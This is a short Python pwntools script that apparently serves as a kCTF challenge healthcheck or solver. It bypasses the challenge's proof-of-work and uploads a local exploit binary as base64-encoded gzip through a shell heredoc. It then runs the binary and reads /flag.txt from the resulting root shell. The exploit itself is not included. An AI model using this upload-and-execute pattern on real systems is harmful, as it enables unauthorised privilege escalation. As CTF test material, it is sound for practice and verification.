#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Copyright 2022-2025 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import pwnlib.tubes
import base64
import gzip


def printraw(c):
    print(c.decode(errors='replace'), end='')


def handle_pow(r):
    printraw(r.recvuntil(b'python3 '))
    printraw(r.recvuntil(b' solve '))
    challenge = r.recvline().decode('ascii').strip()
    p = pwnlib.tubes.process.process(['kctf_bypass_pow', challenge])
    solution = p.readall().strip()
    r.sendline(solution)
    printraw(r.recvuntil(b'Correct\n'))


r = pwnlib.tubes.remote.remote('127.0.0.1', 1337)
printraw(r.recvuntil(b'== proof-of-work: '))
if r.recvline().startswith(b'enabled'):
    handle_pow(r)

printraw(r.recvuntil(b'~ $ '))
r.send(b'cd /tmp\n')

printraw(r.recvuntil(b'/tmp $ '))
r.send(b'base64 -d << EOF | zcat > exploit\n')
with open('/home/user/exploit', 'rb') as f:
    r.send(base64.encodebytes(gzip.compress(f.read())))
r.send(b'\nEOF\n')

printraw(r.recvuntil(b'/tmp $ '))
r.send(b'chmod a+x exploit\n')

printraw(r.recvuntil(b'/tmp $ '))
r.send(b'./exploit\n')

printraw(r.recvuntil(b'/tmp # '))
r.send(b'cat /flag.txt\n')

printraw(r.recvuntil((b'CTF{', b'uiuctf{')))
printraw(r.recvuntil((b'}')))

exit(0)
